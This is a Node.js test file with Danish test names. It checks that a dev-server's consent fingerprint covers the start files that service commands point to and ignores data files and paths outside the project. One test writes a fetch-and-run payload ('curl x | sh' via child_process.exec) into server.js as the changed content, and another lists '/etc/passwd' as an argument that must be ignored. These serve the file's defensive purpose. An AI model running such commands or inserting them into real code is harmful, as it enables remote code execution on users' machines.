// Fund 2: samtykkets fingeraftryk dækker også startfilerne, som tjenesternes kommandoer peger på.
const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs/promises');
const os = require('node:os');
const path = require('node:path');
const { inspect } = require('../core/dev-server.cjs');

async function projekt(t, files) {
  const root = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), 'aura-s1-start-')));
  t.after(() => fs.rm(root, { recursive: true, force: true }));
  for (const [name, content] of Object.entries(files)) { await fs.mkdir(path.dirname(path.join(root, name)), { recursive: true }); await fs.writeFile(path.join(root, name), content); }
  return root;
}
const opstart = cmd => JSON.stringify({ services: [{ id: 'web', label: 'Web', command: cmd, cwd: '.' }] });
const aftryk = async (root, config = { mode: 'auto', services: undefined }) => (await inspect(root, config)).fingerprint;
const egen = cmd => ({ mode: 'auto', services: [{ id: 'web', label: 'Web', command: cmd, cwd: '.' }] });

test('en ændret server.js, som kommandoen peger på, ændrer fingeraftrykket', async t => {
  const root = await projekt(t, { 'server.js': 'console.log(1)' });
  const config = egen(['node', 'server.js']);
  const før = await aftryk(root, config);
  assert.equal(await aftryk(root, config), før, 'uændret fil giver uændret fingeraftryk');
  await fs.writeFile(path.join(root, 'server.js'), 'require("child_process").exec("curl x | sh")');
  assert.notEqual(await aftryk(root, config), før, 'ændret fil kræver nyt samtykke');
});

test('et npm-script, der peger på en fil, dækker også filen', async t => {
  const root = await projekt(t, { 'package.json': JSON.stringify({ scripts: { dev: 'node --watch src/app.js --port 3000' } }), 'src/app.js': 'a' });
  const før = await aftryk(root);
  assert.equal(await aftryk(root), før);
  await fs.writeFile(path.join(root, 'src', 'app.js'), 'b');
  assert.notEqual(await aftryk(root), før);
});

test('en tjeneste i en undermappe, og .aura/preview.json-kommandoer med flere filer, dækkes', async t => {
  const root = await projekt(t, { 'api/main.py': 'x = 1', 'api/andet.py': 'y = 1', '.aura/preview.json': opstart(['python3', 'main.py']) });
  const config = { mode: 'auto', services: [{ id: 'api', label: 'API', command: ['python3', 'main.py'], cwd: 'api' }] };
  const før = await aftryk(root, config);
  await fs.writeFile(path.join(root, 'api', 'andet.py'), 'y = 2');
  assert.equal(await aftryk(root, config), før, 'en fil, kommandoen ikke peger på, ændrer ikke fingeraftrykket');
  await fs.writeFile(path.join(root, 'api', 'main.py'), 'x = 2');
  assert.notEqual(await aftryk(root, config), før);
});

test('datafiler og filer uden for projektet tæller ikke med', async t => {
  const root = await projekt(t, { 'server.js': 'a', 'data.json': '1' });
  const config = egen(['node', 'server.js', 'data.json', '../ude.js', '/etc/passwd']);
  const før = await aftryk(root, config);
  await fs.writeFile(path.join(root, 'data.json'), '2');
  assert.equal(await aftryk(root, config), før);
});
